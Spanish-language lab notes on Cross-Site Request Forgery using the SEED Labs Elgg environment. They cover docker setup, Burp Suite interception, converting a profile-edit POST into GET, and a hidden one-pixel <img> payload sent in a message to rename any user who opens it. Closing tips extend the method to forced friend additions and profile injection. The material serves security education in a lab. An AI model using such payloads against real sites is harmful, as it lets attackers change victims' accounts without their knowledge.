
----
- Tag: #CROSS-SITE #REQUEST #FORGERY #CSRF 
----
>**AVISO: Si a la hora de hacer el ‘**docker-compose up -d**‘, salta un error de tipo: “**networks.net-10.9.0.0 value Additional properties are not allowed (‘name’ was unexpected)**“, lo que tenéis que hacer es en el archivo ‘**docker-compose.yml**‘, borrar la línea número 41, la que pone “**name: net-10.9.0.0**“.

Con hacer esto, ya podréis desplegar el laboratorio sin ningún problema.

El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.

Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.

El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.

Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado (aunque cuidadín que también se pueden hacer cositas con esto).

Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:

- **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
----
# Empezamos desplegando nuestro laboratorio 

- Descargamos el siguiente comprimido.
```
wget https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip
```

- Lo descomprimimos con
```
unzip Labsetup.zip
```

- Ingresamos a la carpeta y deplegamos el docker 
```
docker-compose up -d 
```

- En este punto deberiamos realizar las siguientes modificaciones en la ruta **/etc/hosts** ya el laboratorio contiene una ip especifica para cada puerto.
```
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32.com
10.9.105 www.attacker32.com
```
- En este caso solo nos enfocaremos en el dominio www.seed-server.com para realizar la práctica, eh ingresamos al dominio desde nuestro navegador.
- En este ejemplo usaremos solo dos usuarios y contraseñas que serian creados con nvim un archivo .txt
```
alice:seedalice
samy:seedsamy
```
- Una vez dentro podemos revisar el identificador de usuario con overing
- Y testear o editar esto con burpsuite en usuario no previlegiado
```
burpsuite &> /dev/null & disown
```
- Interceptamos la petición con foxyproxy de cambiarle el nombre en la pagina y ver que pasa con burpsuite
- Vemos que se pide una solicitud por POST /action/profile/edit HTTP/1.1
- Ahora intentaremos cambiar la solicitud por **GET**
- Enviamos al repeater con Ctrl+R
- Ahora refrescamos la pagina y regresamos a la parte donde toca editar el nombre de usuario
- Interceptamos con burpsuite y con click derecho cambiamos a la opción **change request metod** en la información del repeater
- Hacemos una pequeña verificación de datos borrando los codigos en la primera linea del repeater
- Damos click en **SEND** y vemos que nos da una repuesta 302 no found
- Ponemos click en **Follow redirection** y ahora si recargamos de nuevo la pagina debería cambiarse al nombre que ingresamos en el **repeater**
## Ahora ingresamos con el usuario de samy
- Vemos que podemos enviar mensajes a los usuarios, lo que haremos es crear una estructura en **HTML** para enviarle Alice para que lo abra y cambiar su nombre 
- El mensaje seria de la siguiente manera
```HTML
<img src="http://www.seed-server.com/action/profile/edit?name=HACKED&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56"alt="image"width="1"height="1"/>
```
- Enviando esto nos permitiría cambiar el nombre de usuario de la persona que abra el mensaje 
- Tambien podriamos utilizar el mismo metodo a traves de la dirección URL

# Tips o datos:
- Podriamos utilizar este mismo metodo para poder agregar amigos a la lista sin necesidad de que la acepten
- Podríamos vulnerar cualquier campo que sea editable 
- También podríamos insertar código en nuestro perfil para que cuando la gente la vea se inyecte del texto por detrás y así lograr cambiar áreas textiables.